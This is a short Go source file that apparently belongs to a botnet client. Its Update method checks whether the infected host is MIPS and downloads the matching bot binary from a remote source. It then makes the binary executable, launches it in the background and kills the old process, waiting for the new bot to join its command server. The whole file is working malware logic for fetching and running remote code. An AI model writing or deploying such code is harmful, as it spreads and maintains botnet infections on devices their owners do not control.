package lib

import "time"

func (b *Bot) Update() {
	if setCall, setKey := SetupCaller(); setKey {
		defer Kill()
		b.Report("START UPDATING...")

		/*
			Match the bot architecture.
		*/
		if Find(execComd("tail", "-1", "/var/tmp/"+fileName(true)), "[mips]") {
			pullWeb(fileName(false), setCall.CallBot.MipsArch)
		} else {
			pullWeb(fileName(false), setCall.CallBot.DefaultArch)
		}

		execComd("chmod", "700", fileName(false))
		go execComd("./"+fileName(false), "&")
		time.Sleep(10 * time.Second) //Wait for the bot to join the server.
	}
}
